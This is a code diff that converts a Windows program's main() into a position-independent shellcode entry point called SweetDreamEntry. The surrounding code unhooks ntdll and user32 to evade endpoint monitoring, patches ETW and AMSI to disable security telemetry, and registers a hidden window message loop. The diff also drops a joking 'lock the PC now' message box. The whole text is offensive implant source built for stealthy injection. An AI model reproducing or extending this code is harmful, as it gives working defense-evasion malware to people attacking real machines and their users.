@@ -1,6 +1,6 @@
 #include "../include/Common.h"
 
-int main(void) {
+extern "C" void __attribute__((stdcall, section(".text$B"))) SweetDreamEntry(void) {
 	PVOID hNtDll = nullptr;
 	PVOID hUser32 = nullptr;
 	NTSTATUS NtStatus = NULL;
@@ -21,13 +21,13 @@ int main(void) {
 	hNtDll = sdGetModuleHandle(NTDLL);
 
 	if (!sdUnhookDll(NTDLL, hNtDll)) {
-		return 1;
+		return;
 	}
 	if (!sdPatchEtw(hNtDll)) {
-		return 1;
+		return;
 	}
 	if (!sdPatchAmsi(hNtDll)) {
-		return 1;
+		return;
 	}
 
 	LdrLoadDll = (LdrLoadDll_t)sdGetProcAddress(hNtDll, LDR_LOAD_DLL);
@@ -37,16 +37,16 @@ int main(void) {
 
 	NtStatus = LdrLoadDll(0, 0, &ustrDll, &hUser32);
 	if (NtStatus != STATUS_SUCCESS && NtStatus != STATUS_IMAGE_ALREADY_LOADED) {
-		return 1;
+		return;
 	}
 
 	if (!sdUnhookDll(USER32, hUser32)) {
-		return 1;
+		return;
 	}
 
 	// feverdream setup
 	Wnd.cbSize = sizeof(WNDCLASSEXW);
-	Wnd.lpfnWndProc = WindowMessageReceiveRoutine;
+	Wnd.lpfnWndProc = (WNDPROC) G_SYM( WindowMessageReceiveRoutine );
 	Wnd.hInstance = (HINSTANCE)((PLDR_DATA_TABLE_ENTRY)entry)->DllBase;
 	Wnd.lpszClassName = L" ";
 
@@ -63,7 +63,6 @@ int main(void) {
 		goto EXIT_ROUTINE;
 	}
 
-	MessageBoxA(NULL, "Meow Meow- Might wanna lock the PC now", "> ^..^ <", MB_OK);
 MSG_LOOP:
 	bFlag = GetMsgW(&Message, NULL, 0, 0);
 	if (bFlag == -1 || bFlag == FALSE) {
@@ -78,5 +77,6 @@ EXIT_ROUTINE:
 	if (!bFlag) {
 		dwError = LastError;
 	}
-	return dwError;
+
+	return;
 }
